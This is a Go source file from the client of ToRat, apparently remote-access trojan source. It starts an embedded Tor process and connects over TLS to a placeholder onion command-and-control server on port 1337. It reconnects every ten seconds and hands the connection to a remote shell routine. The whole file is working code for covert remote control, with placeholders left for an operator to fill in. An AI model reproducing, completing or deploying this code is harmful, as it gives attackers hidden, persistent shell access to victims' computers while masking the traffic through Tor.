// +build !notor, !windows

package client

import (
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"log"
	"net"
	"runtime"
	"time"

	"github.com/cretz/bine/process/embedded"
	"github.com/cretz/bine/tor"
	"github.com/lu4p/ToRat_client/crypto"
)

const (
	// serverDomain needs to be changed to your address
	serverDomain = "youronionadresshere.onion"
	serverPort   = ":1337"
	serverAddr   = serverDomain + serverPort
)

// serverCert needs to be changed to the TLS certificate of the server
// intendation breaks the certificate
const serverCert = `-----BEGIN CERTIFICATE-----
____ CERTIFICATE GOES HERE | DONT INDENT ____
-----END CERTIFICATE-----`

var ServerPubKey *rsa.PublicKey

type connection struct {
	Conn    net.Conn
	Sysinfo string
}

func connect(dialer *tor.Dialer) (net.Conn, error) {
	conn, err := dialer.Dial("tcp", serverAddr)
	if err != nil {
		return nil, err
	}
	log.Println("connect")
	caPool := x509.NewCertPool()
	caPool.AppendCertsFromPEM([]byte(serverCert))

	config := tls.Config{RootCAs: caPool, ServerName: serverDomain}
	tlsconn := tls.Client(conn, &config)
	if err != nil {
		return nil, err
	}
	return tlsconn, nil
}

// NetClient start tor and invoke connect
func NetClient() {
	log.Println("NetClient")
	var err error
	ServerPubKey, err = crypto.CertToPubKey(serverCert)
	if err != nil {
		log.Fatalln("[!] Could not extract RsaKey from cert")
	}
	var conf tor.StartConf
	if runtime.GOOS == "windows" {
		conf = tor.StartConf{ExePath: TorExe, ControlPort: 9051, DataDir: TorData, NoAutoSocksPort: true}
	} else {
		conf = tor.StartConf{ProcessCreator: embedded.NewCreator()}
	}

	t, err := tor.Start(nil, &conf)
	if err != nil {
		log.Println("[!] Tor could not be started:", err)
		return
	}
	defer t.Close()
	dialer, _ := t.Dialer(nil, nil)
	for {
		conn, err := connect(dialer)
		if err != nil {
			log.Println("Could not connect:", err)
			time.Sleep(10 * time.Second)
			continue
		}
		c := new(connection)
		c.Conn = conn
		c.shell()
	}
}
